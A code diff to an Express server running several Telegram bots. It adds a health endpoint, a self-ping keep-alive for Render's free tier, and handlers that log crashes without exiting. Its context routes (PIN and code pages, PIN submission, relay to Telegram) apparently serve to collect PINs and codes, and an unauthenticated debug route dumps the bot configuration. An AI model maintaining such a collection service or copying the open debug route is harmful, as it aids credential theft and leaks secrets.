@@ -71,7 +71,6 @@ async function setWebhook(bot) {
     }
 }
 
-// Set webhook for all bots at startup
 async function setAllWebhooks() {
     for (const bot of bots) await setWebhook(bot);
 }
@@ -85,6 +84,16 @@ app.get('/bot/:botId', (req, res) => {
 app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
 app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
 app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));
+
+// ---------------- HEALTH / KEEP-ALIVE ENDPOINT ----------------
+app.get('/health', (req, res) => {
+    res.json({
+        status: 'ok',
+        uptime: process.uptime(),
+        timestamp: new Date().toISOString(),
+        bots: bots.map(b => b.botId)
+    });
+});
 
 // ---------------- PIN SUBMISSION ----------------
 app.post('/submit-pin', (req, res) => {
@@ -160,7 +169,63 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 // ---------------- DEBUG ----------------
 app.get('/debug/bots', (req, res) => res.json(bots));
 
+// =====================================================
+//          KEEP-ALIVE (ANTI-SLEEP) SYSTEM
+// =====================================================
+// Render free tier sleeps a web service after 15 min of inactivity.
+// We ping our own /health endpoint every 10 min to keep it awake.
+
+const KEEPALIVE_INTERVAL_MS = 10 * 60 * 1000; // 10 minutes
+let keepAliveTimer = null;
+
+async function selfPing() {
+    try {
+        const url = `${DOMAIN}/health`;
+        const res = await axios.get(url, { timeout: 20000 });
+        console.log(`💓 Keep-alive OK (${res.status}) → ${url} @ ${new Date().toISOString()}`);
+    } catch (err) {
+        console.warn(`⚠️ Keep-alive failed: ${err.response?.status || err.message}`);
+        // If self-ping fails (e.g. own instance is cold), try one extra ping after 30s
+        setTimeout(() => {
+            axios.get(`${DOMAIN}/health`, { timeout: 20000 })
+                .then(r => console.log(`💓 Keep-alive retry OK (${r.status})`))
+                .catch(e => console.warn(`⚠️ Keep-alive retry failed: ${e.message}`));
+        }, 30 * 1000);
+    }
+}
+
+function startKeepAlive() {
+    if (keepAliveTimer) clearInterval(keepAliveTimer);
+    // Initial ping shortly after boot
+    setTimeout(selfPing, 15 * 1000);
+    // Then every 10 minutes
+    keepAliveTimer = setInterval(selfPing, KEEPALIVE_INTERVAL_MS);
+    console.log('🩺 Keep-alive démarré (ping toutes les 10 min)');
+}
+
+// =====================================================
+//      GLOBAL CRASH GUARDS (auto-recover process)
+// =====================================================
+process.on('uncaughtException', (err) => {
+    console.error('💥 uncaughtException:', err);
+    // Don't exit — keep the process alive so Render doesn't restart it cold.
+});
+
+process.on('unhandledRejection', (reason) => {
+    console.error('💥 unhandledRejection:', reason);
+});
+
+// Graceful shutdown so Render restarts are clean
+process.on('SIGTERM', () => {
+    console.log('🛑 SIGTERM reçu, arrêt propre...');
+    if (keepAliveTimer) clearInterval(keepAliveTimer);
+    process.exit(0);
+});
+
 // ---------------- START SERVER ----------------
 setAllWebhooks().then(() => {
-    app.listen(PORT, () => console.log(`🚀 Serveur démarré sur le port ${PORT}`));
+    app.listen(PORT, () => {
+        console.log(`🚀 Serveur démarré sur le port ${PORT}`);
+        startKeepAlive();
+    });
 });
